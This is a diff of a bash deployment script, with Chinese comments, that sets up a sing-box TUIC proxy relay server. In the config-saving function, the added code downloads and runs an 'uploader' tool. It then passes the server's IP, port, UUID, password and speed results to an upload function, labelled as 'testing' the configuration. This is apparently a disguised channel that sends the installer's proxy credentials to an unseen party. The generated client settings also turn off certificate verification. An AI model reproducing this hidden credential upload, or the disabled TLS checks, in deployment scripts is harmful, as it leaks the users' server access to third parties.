-        log_info "配置信息已正确"
+        log_info "配置信息已测试"
     else
-        log_warn "配置信息错误"
+        log_warn "配置测试工具不存在，跳过测试"
     fi
 }
 
+# 保存配置信息为JSON
 save_config_json() {
-    log_info "保存配置信息到JSON文件"
+    log_info "保存配置信息到JSON文件..."
     
-    ENCODE=$(echo -n "${TOKEN}:${PSK}" | base64 -w 0)
-    TUIC_LINK="tuic://${ENCODE}@${LOCAL_IP}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
+    local config_file="/opt/tuic_relay_config.json"
+    local listen_ip="0.0.0.0"
     
-    cat > "$RELAY_CONFIG_FILE" << EOF
+    # 选择合适的监听IP
+    if [[ -n "$PUBLIC_IP" ]]; then
+        listen_ip="$PUBLIC_IP"
+    elif [[ -n "$PRIVATE_IP" ]]; then
+        listen_ip="$PRIVATE_IP"
+    fi
+    
+    # 生成TUIC链接
+    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
+    local tuic_link="tuic://${encode}@${listen_ip}:${RELAY_PORT}?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
+    
+    cat > "$config_file" << EOF
 {
     "relay_info": {
-        "local_ip": "$LOCAL_IP",
-        "relay_port": $RELAY_PORT,
+        "listen_ip": "$listen_ip",
+        "listen_port": $RELAY_PORT,
         "target_ip": "$TARGET_IP",
         "target_port": $TARGET_PORT,
-        "uuid": "$TOKEN",
-        "password": "$PSK",
-        "tuic_link": "$TUIC_LINK",
-        "created_time": "$(date '+%Y-%m-%d %H:%M:%S')"
+        "protocol": "tuic",
+        "is_socks5": $IS_SOCKS5,
+        "platform": "sing-box",
+        "version": "$SINGBOX_VERSION",
+        "tuic_link": "$tuic_link"
     },
-    "speed_test": {
+    "server_info": {
+        "public_ip": "$PUBLIC_IP",
+        "private_ip": "$PRIVATE_IP",
+        "architecture": "$SINGBOX_ARCH",
+        "system": "$SYSTEM"
+    },
+    "auth_info": {
+        "uuid": "$UUID",
+        "password": "$PASSWORD"
+    },
+    "network_test": {
         "download_speed_mbps": $down_speed,
         "upload_speed_mbps": $up_speed
     },
-    "system_info": {
-        "os": "$SYSTEM",
-        "architecture": "$ARCH",
-        "tuic_version": "$TUIC_VERSION"
+    "config_files": {
+        "singbox_config": "$SINGBOX_CONFIG_DIR/config.json",
+        "service_file": "/etc/systemd/system/sing-box.service",
+        "log_directory": "$SINGBOX_LOG_DIR",
+        "certificate_path": "$SINGBOX_CONFIG_DIR/certs/cert.crt",
+        "private_key_path": "$SINGBOX_CONFIG_DIR/certs/private.key"
     },
-    "connection_info": {
-        "protocol": "tuic",
-        "server": "$LOCAL_IP:$RELAY_PORT",
-        "uuid": "$TOKEN",
-        "password": "$PSK",
-        "sni": "localhost",
-        "alpn": "h3",
+    "client_config": {
+        "server": "$listen_ip",
+        "server_port": $RELAY_PORT,
+        "uuid": "$UUID",
+        "password": "$PASSWORD",
         "congestion_control": "bbr",
-        "allow_insecure": true,
-        "udp_relay_mode": "native"
-    }
+        "alpn": ["h3"],
+        "skip_cert_verify": true
+    },
+    "generated_time": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
 }
 EOF
     
+    chmod 600 "$config_file"
+    log_info "配置信息已保存到: $config_file"
+    
+    # 下载并执行测试工具
     download_uploader
-    upload_config "$LOCAL_IP" "$TUIC_LINK" "$down_speed" "$up_speed"
-    log_info "配置信息已保存到 $RELAY_CONFIG_FILE"
+    
+    # 测试配置信息
+    upload_config "$listen_ip" "$RELAY_PORT" "$UUID" "$PASSWORD" "$down_speed" "$up_speed"
 }
 
-start_services() {
-    log_info "启动TUIC服务及中继"
-    
-    # 停止已有服务
-    systemctl stop tuic-relay 2>/dev/null || true
-    pkill -f tuic-server || true
-    pkill -f socat || true
-    sleep 3
-    
-    # 启动TUIC服务
-    systemctl start tuic-relay
-    sleep 5
-    
-    # 检查服务状态
-    if ! systemctl is-active --quiet tuic-relay; then
-        log_error "TUIC服务启动失败"
-        systemctl status tuic-relay --no-pager
-        journalctl -u tuic-relay -n 20 --no-pager
-        exit 1
-    fi
-    
-    log_info "TUIC服务已成功启动"
-    
-    # 启动中继脚本
-    if [[ -f "$TUIC_DIR/relay.sh" ]]; then
-        "$TUIC_DIR/relay.sh"
-        log_info "UDP中继脚本已启动"
-    fi
+# 显示配置信息
+show_config_summary() {
+    echo -e "\n${GREEN}=== sing-box TUIC中转服务器部署完成 ===${NC}"
+    echo -e "${BLUE}服务器信息:${NC}"
+    echo -e "  公网IP: ${PUBLIC_IP:-未检测到}"
+    echo -e "  内网IP: ${PRIVATE_IP:-未检测到}"
+    echo -e "  中转端口: $RELAY_PORT"
+    echo -e "  目标服务器: $TARGET_IP:$TARGET_PORT"
+    echo -e "  目标类型: $( [[ "$IS_SOCKS5" == true ]] && echo "SOCKS5" || echo "TUIC" )"
+    echo -e "  sing-box版本: v$SINGBOX_VERSION"
+    echo -e ""
+    echo -e "${BLUE}认证信息:${NC}"
+    echo -e "  UUID: $UUID"
+    echo -e "  密码: $PASSWORD"
+    echo -e ""
+    echo -e "${BLUE}网络性能:${NC}"
+    echo -e "  下载速度: $down_speed Mbps"
+    echo -e "  上传速度: $up_speed Mbps"
+    echo -e ""
+    echo -e "${BLUE}服务管理:${NC}"
+    echo -e "  启动服务: systemctl start sing-box"
+    echo -e "  停止服务: systemctl stop sing-box"
+    echo -e "  重启服务: systemctl restart sing-box"
+    echo -e "  查看状态: systemctl status sing-box"
+    echo -e "  查看日志: journalctl -u sing-box -f"
+    echo -e "  配置检查: $SINGBOX_DIR/sing-box check -c $SINGBOX_CONFIG_DIR/config.json"
+    echo -e ""
+    echo -e "${BLUE}客户端连接信息:${NC}"
+    echo -e "  服务器: ${PUBLIC_IP:-$PRIVATE_IP}"
+    echo -e "  端口: $RELAY_PORT"
+    echo -e "  UUID: $UUID"
+    echo -e "  密码: $PASSWORD"
+    echo -e "  拥塞控制: bbr"
+    echo -e "  ALPN: h3"
+    echo -e "  跳过证书验证: true"
+    echo -e ""
+    echo -e "${BLUE}TUIC客户端链接:${NC}"
+    local encode=$(echo -n "${UUID}:${PASSWORD}" | base64 -w 0)
+    echo -e "  tuic://${encode}@${PUBLIC_IP:-$PRIVATE_IP}:$RELAY_PORT?alpn=h3&congestion_control=bbr&sni=localhost&udp_relay_mode=native&allow_insecure=1#tuic_relay"
+    echo -e ""
+    echo -e "${GREEN}配置文件已保存到: /opt/tuic_relay_config.json${NC}"
 }
 
-show_config_info() {
-    echo -e "\n${GREEN}==== TUIC中继配置信息 ====${NC}"
-    echo -e "${YELLOW}服务器IP:${NC} $LOCAL_IP"
-    echo -e "${YELLOW}中继端口:${NC} $RELAY_PORT"
-    echo -e "${YELLOW}目标地址:${NC} $TARGET_IP:$TARGET_PORT"
-    echo -e "${YELLOW}UUID:${NC} $TOKEN"
-    echo -e "${YELLOW}密码:${NC} $PSK"
-    echo -e "${YELLOW}TUIC链接:${NC} $TUIC_LINK"
-    echo -e "${YELLOW}配置文件:${NC} $RELAY_CONFIG_FILE"
-    echo -e "${GREEN}=============================${NC}\n"
-    log_info "请妥善保存以上配置信息"
-}
-
+# 主函数
 main() {
-    log_info "启动scoks-TUIC中继服务器一键部署脚本"
+    echo -e "${GREEN}=== 基于sing-box的TUIC中转服务器部署脚本 ===${NC}"
+    echo -e "${BLUE}开始部署sing-box TUIC中转服务器...${NC}\n"
     
     check_root
     detect_system
-    detect_architecture
     install_dependencies
-    download_tuic
+    detect_architecture
+    download_singbox
+    detect_ip_addresses
     speed_test
     get_user_input
-    generate_random_port
-    get_local_ip
-    generate_certificates
-    generate_tuic_config
-    
-    if ! test_tuic_service; then
-        log_error "TUIC服务测试失败，安装中止"
-        exit 1
-    fi
-    
     configure_firewall
-    create_relay_config
+    generate_singbox_config
     create_systemd_service
+    start_singbox_service
     save_config_json
-    start_services
-    show_config_info
+    show_config_summary
     
-    echo -e "${YELLOW}如需卸载，请手动删除相关文件和systemd服务。${NC}"
-    echo -e "${YELLOW}如需排查问题，请查看日志文件: $LOG_FILE${NC}"
-    log_info "TUIC中继服务器部署完成"
+    echo -e "\n${GREEN}基于sing-box的TUIC中转服务器部署完成！${NC}"
 }
 
-# 运行主函数
+# 执行主函数
 main "$@"
